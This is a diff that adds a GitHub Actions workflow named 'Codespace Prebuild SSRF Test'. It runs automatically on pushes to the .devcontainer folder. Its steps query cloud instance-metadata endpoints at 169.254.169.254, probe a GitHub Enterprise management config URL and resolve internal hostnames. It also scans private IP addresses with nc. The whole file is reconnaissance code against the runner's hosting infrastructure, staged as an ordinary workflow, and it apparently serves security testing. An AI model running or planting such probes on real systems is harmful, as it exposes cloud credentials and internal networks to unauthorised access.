@@ -1,0 +1,33 @@
+name: Codespace Prebuild SSRF Test
+on:
+  workflow_dispatch:
+  push:
+    paths:
+      - '.devcontainer/**'
+
+jobs:
+  prebuild-test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      
+      - name: SSRF Probe from Actions Runner
+        run: |
+          echo "=== ACTIONS RUNNER SSRF TEST ==="
+          echo "=== IMDS ===" 
+          curl -s -m 3 http://169.254.169.254/latest/meta-data/ || true
+          curl -s -m 3 -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" || true
+          echo ""
+          echo "=== GHE.IO ==="
+          curl -sv -m 5 http://ghe.io:8443/manage/v1/config/init 2>&1 | head -20 || true
+          echo ""
+          echo "=== INTERNAL DNS ==="
+          for h in ghe.io github.localhost ghcr.io actions-results.actions.githubusercontent.com; do
+            echo -n "$h: "
+            getent hosts $h 2>/dev/null || dig +short $h 2>/dev/null || echo "NXDOMAIN"
+          done
+          echo ""
+          echo "=== NETWORK SCAN ==="
+          for ip in 10.0.0.1 172.17.0.1 192.168.1.1; do
+            timeout 2 nc -zv $ip 80 2>&1 || echo "$ip:80 closed"
+          done
